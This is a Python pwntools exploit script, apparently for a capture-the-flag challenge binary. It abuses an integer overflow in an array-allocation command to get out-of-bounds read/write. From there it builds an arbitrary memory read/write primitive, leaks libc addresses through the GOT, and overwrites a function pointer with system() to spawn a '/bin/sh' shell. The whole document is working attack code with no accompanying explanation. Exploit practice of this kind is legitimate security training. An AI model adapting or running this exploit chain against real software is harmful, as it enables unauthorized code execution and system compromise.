#!/usr/bin/env python
from pwn import *

# context.log_level = "DEBUG"
context.binary    = "./a2.out"

p = process(context.binary.path) if True else remote("ctf.target.com", 1337)

def init(identifier, type_of_array, length):
	p.sendlineafter("\n> ", "init {} {} {}".format(identifier, type_of_array, length))

def get(identifier, index, noreturn=False):
	p.sendlineafter("\n> ", "get {} {}".format(identifier, index))
	if not noreturn: return int(p.recvline())

def set(identifier, index, value):
	p.sendlineafter("\n> ", "set {} {} {}".format(identifier, index, value))

def get_arbitrary_RW():
	global B_base	
	init("A", 64, 2305843009213693953); 			log.info("Exploiting integer overflow to get an OOB R/W primitive")
	init("B", 64, 8);					log.info("Allocating a new array")
	set("B", 0, 0x4141414141414141);    			log.info("Setting a flag to identify the array in memory")
	i = 0;							log.info("Perform OOB reads until the flag is found")	
	while get("A", i) != 0x4141414141414141: i += 1	
	B_base = i-6;						log.info("Array found! arbitrary R/W primitive built\n")

def read8(where):
	set("A", B_base+2, where)
	return get("B", 0)

def write8(where, what):
	set("A", B_base+2, where)
	set("B", 0, what)

def leak_libc():
	global libc ;						log.info("Leaking libc addresses")
	printf = read8(context.binary.sym.got.printf)
	puts   = read8(context.binary.sym.got.puts)
	# 		log.info("Identifying libc")								
	libc = ELF("./libc.so.6");		
	libc.address += printf-libc.sym.printf

def pop_shell():	
	set("A", B_base, 0x0068732f6e69622f);			log.info("Overwriting firts parameter with '/bin/sh\\x00'")	
	set("A", B_base+3, libc.sym.system);			log.info("Overwriting function pointer with system() address")
	get("B", 0, noreturn=True);				log.info("Calling system('/bin/sh')")
	p.interactive()
	p.close()

def exploit():
	get_arbitrary_RW()
	leak_libc()
	pop_shell()

exploit()
